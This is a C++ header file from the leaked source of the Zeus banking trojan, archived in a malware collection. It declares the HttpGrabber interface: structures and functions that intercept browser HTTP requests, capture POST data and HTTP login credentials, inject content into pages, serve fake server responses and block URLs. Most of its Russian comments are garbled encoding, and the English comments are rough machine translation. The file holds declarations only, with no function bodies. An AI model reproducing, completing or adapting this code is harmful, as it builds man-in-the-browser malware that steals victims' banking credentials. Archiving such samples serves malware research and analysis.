/*
  name      Zeus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
/*
  ����� ������� ��� ��������� HTTP.
*/
#pragma once

#if(BO_WININET > 0 || BO_NSPR4 > 0 || 1)

#include "..\common\httpinject.h"
#include "..\common\binstorage.h"

namespace HttpGrabber
{
  //Different constants.
  enum
  {
    MAX_POSTDATA_SIZE = 1 * 1024 * 1024
  };
  
  //Type of request.
  enum
  {
    VERB_GET,  //GET
    VERB_POST  //POST
  };

  //These inzheyte to fakie.
  typedef struct
  {
    DWORD flags;                      //Flags HttpInject:: FLAG_ *.
    LPSTR urlMask;                    //Mask URL.
    LPSTR fakeUrl;                    //URL Faika if it is fake.
    LPSTR blockOnUrl;                 //URL blocking this Faika / injection produce.
    LPSTR contextMask;                //White mask content.
    HttpInject::INJECTBLOCK *injects; //These injection produce. Already checked for errors.
    DWORD injectsSize;                //Injects size in bytes.
  }INJECTFULLDATA;

  //Query flags.
  enum
  {
    RDF_WININET = 0x1, //Request came from the wininet.
    RDF_NSPR4   = 0x2, //Request came from NSPR4.
  };

  //Request data.
  typedef struct
  {    
    /*
      �����.
    */
    DWORD flags;
    
    /*
      IN ����� ����� ������� (������� �� ��������������� ����������).
    */
    void *handle;
    
    /*
      IN URL. ���������� ����� Mem.
      
      ������������� ����� _freeRequestData().
    */
    LPSTR url;

    /*
      IN ���. ���� � URL, �������� �������� ����.
    */
    DWORD urlSize;

    /*
      IN �������.
      
      ������������� ����� _freeRequestData().
    */
    LPSTR referer;

    /*
      IN ���. ���� � ����������, �������� �������� ����.
    */
    DWORD refererSize;

    /*
      IN VERB_*.
    */
    BYTE verb;

    /*
      IN ��� ��������, �.�. ��� POST-������.
      
      ������������� ����� _freeRequestData().
    */
    LPSTR contentType;

    /*
      IN ������ contentTypeSize.
    */
    DWORD contentTypeSize;

    /*
      IN OUT POST-������ (����� �� ��������� �� 0). ���� �������� ����
      ANALIZEFLAG_POSTDATA_REPLACED,������ ����� ��������� �� ����� ������, ������� �����
      ���������� ����� Mem ����� �������� �������.
    */
    void *postData;

    /*
      IN OUT ������ postData. �������� �� ������ ��������� MAX_POSTDATA_SIZE.
    */
    DWORD postDataSize;

    /*
      IN ������ HTTP-�����������.
    */
    struct 
    {
      LPWSTR userName;   //User name.
      LPWSTR password;   //Password.
      LPSTR unknownType; //Filled the original string if an unknown type of authorization.
    }authorizationData;

    /*
      OUT ������ ��������, ��������� ������ ��� ANALIZEFLAG_URL_INJECT. 

      ������������� ����� _freeInjectFullDataList().
    */
    INJECTFULLDATA *injects;

    /*
      OUT ������ ������� injectData.
    */
    DWORD injectsCount;

    /*
      IN ������� ������������. NULL, ���� �� ���������. ������ ������������ �������� ������ ���
      ������.

      ������������� ����� _freeRequestData().
    */
    BinStorage::STORAGE *dynamicConfig;

    /*
      IN ������� ��������� ������������. NULL, ���� �� ���������. ������ ������������ ��������
      ������ ��� ������.

      ������������� ����� _freeRequestData().
    */
    BinStorage::STORAGE *localConfig;
  }REQUESTDATA;

  //Flags for analizeRequestData ().
  enum
  {
    ANALIZEFLAG_URL_BLOCKED         = 0x01, //To applicable. External interrupt handler must query the
                                           //URL. When this flag can not be returned
                                           //ANALIZEFLAG_POSTDATA_REPLACED, ANALIZEFLAG_URL_INJECT.
    
    ANALIZEFLAG_URL_INJECT          = 0x02, //Action. The data on inzheyt / fake.

    ANALIZEFLAG_POSTDATA_REPLACED   = 0x04, //Действие. Новые POST-данные сохранены в REQUESTDATA.postData.


    ANALIZEFLAG_SAVED_REPORT        = 0x08, //Information. Query is stored in the report.
    
    ANALIZEFLAG_POSTDATA_URLENCODED = 0x10, //Post data coded in "application / x-www-form-urlencoded".

    ANALIZEFLAG_AUTHORIZATION       = 0x20  //Data is present HTTP-authorization.
  };

  /*
    �������������.
  */
  void init(void);

  /*
    ���������������.
  */
  void uninit(void);

  /*
    ��������� ���� ��� ����� ��������� ����� ������������ URL �� ������ �� ����� (������ ����������� ��? ;))

    IN fakeUrl     - �������� URL, ������� ����� ��������� ����� �� originalUrl.
    IN originalUrl - ������������ URL, ������� ������� � ������ urlMask.
    IN urlMask     - urlMask ����� URL, � ������� ����������� ������ ������������ ������ '/'.

    Return         - ������ URL ����� (����� ������� ����� Mem),
                     NULL - � ������ ������.
  */
  LPSTR _genarateMirrorFakeUrlA(const LPSTR fakeUrl, const LPSTR originalUrl, const LPSTR urlMask);
  
  /*
    ���������� ��� Str::matchA() ��� URL.

    IN mask     - �����.
    IN url      - URL.
    IN urlSize  - ������ URL.
    IN advFlags - �������������� ����� Str::MATCH_*.

    Return - true  - ���������� �������,
             false - ���������� �� �������.
  */
  bool _matchUrlA(const LPSTR mask, const LPSTR url, DWORD urlSize, DWORD advFlags);

  /*
    ���������� ��� Str::matchA() ��� POST-������.

    IN mask         - �����.
    IN postData     - POST-������.
    IN postDataSize - ������ POST-������.

    Return          - true  - ���������� �������,
                      false - ���������� �� �������.
  */
  bool _matchPostDataA(const LPSTR mask, const LPSTR postData, DWORD postDataSize);
  
  /*
    ���������� ��� Str::matchA() ��� ���������� �����������.

    IN mask        - �����.
    IN context     - ����������.
    IN contextSize - ������ �����������.
    IN advFlags    - �������������� ����� Str::MATCH_*.

    Return         - true  - ���������� �������,
                     false - ���������� �� �������.
  */
  bool _matchContextA(const LPSTR mask, const void *context, DWORD contextSize, DWORD advFlags);

  /*
    ���������� ��� Str::matchA() ��� ���������� �����������.

    IN mask         - �����.
    IN maskSize     - ������ �����.
    IN context      - ����������.
    IN contextSize  - ������ �����������.
    OUT offsetBegin - ������ ������ �������� ����� � context. ����� ���� NULL.
    OUT offsetEnd   - ������ ����� �������� ����� � context. ����� ���� NULL.
    IN advFlags     - �������������� ����� Str::MATCH_*.

    Return          - true  - ���������� �������,
                      false - ���������� �� �������.
  */
  bool _matchContextExA(const void *mask, DWORD maskSize, const void *context, DWORD contextSize, LPDWORD offsetBegin, LPDWORD offsetEnd, DWORD advFlags);

  /*
    ���������� �������� � ������ URL.

    IN listId          - ��� ������ LocalConfig::ITEM_URLLIST_*.
    IN OUT localConfig - ��������� ������������.
    IN urlMask         - ����� URL.

    Return             - true - � ������ ������,
                         false - � ������ ������.

  */
  bool _addUrlMaskToList(DWORD listId, BinStorage::STORAGE **localConfig, const LPSTR urlMask);
  
  /*
    �������� �������� �� ������ URL.

    IN listId          - ��� ������ LocalConfig::ITEM_URLLIST_*.
    IN OUT localConfig - ��������� ������������.
    IN maskOfurlMask   - ����� ����� URL.

    Return             - true - � ������ ������,
                         false - � ������ ������.

  */
  bool _removeUrlMaskFromList(DWORD listId, BinStorage::STORAGE **localConfig, const LPSTR maskOfurlMask);
  
  /*
    �������� ���������� �� URL � ������.

    IN listId      - ��� ������ LocalConfig::ITEM_URLLIST_*.
    IN localConfig - ��������� ������������.
    IN url         - URL.
    IN urlSize     - ������ URL.
    IN advFlags    - �������������� ����� Str::MATCH_*.

    Return         - true - URL �������,
                     false - URL �� �������.
  */
  bool _isUrlInList(DWORD listId, const BinStorage::STORAGE *localConfig, const LPSTR url, DWORD urlSize, DWORD advFlags);
  
  /*
    ������ URL, � ��������� ������������� ����� ��� ���.

    IN OUT requestData - ������ �������.
    
    Return             - ANALIZEFLAG_*.
  */
  DWORD analizeRequestData(REQUESTDATA *requestData);

  /*
    ���������� �������� � ���������.

    IN url             - URL.
    IN OUT context     - �������� ��� ���������.
    IN OUT contextSize - ������ ���������.
    IN dataList        - ������ ��������.
    IN count           - ���. ��������.

    Return             - true - � ������� ���� ������� ���������,
                         false - ��������� �� ���� ������� (�� �������� ������).
  */
  bool _executeInjects(const LPSTR url, LPBYTE *context, LPDWORD contextSize, const INJECTFULLDATA *dataList, DWORD count);

  /*
    ���������, �������� �� ������ ������.

    IN dataList - ������.
    IN count    - ������ �������.

    Return      - true - ��������,
                  false - �� ��������.
  */
  bool _isFakeData(INJECTFULLDATA *dataList, DWORD count);
  
  /*
    ������������ ���� ������ REQUESTDATA ����������� ����� Mem.

    IN OUT requestData - ���������.
  */
  void _freeRequestData(REQUESTDATA *requestData);

  /*
    ������������ ���� ������ INJECTFULLDATA ����������� ����� Mem.

    IN OUT data - ���������.
  */
  void _freeInjectFullData(INJECTFULLDATA *data);
  
  /*
    ������������ ����� ������� INJECTFULLDATA.

    IN dataList - ������.
    IN count    - ������ �������.
  */
  void _freeInjectFullDataList(INJECTFULLDATA *dataList, DWORD count);

  /*    Creating a fake response from the server.

    IN requestData - data of the original query.
    IN fakeData - Faika data.

    Return - the handle of the server's response, NULL - otherwise.
  */
  HINTERNET _createFakeResponse(REQUESTDATA *requestData, INJECTFULLDATA *fakeData);
};
#endif
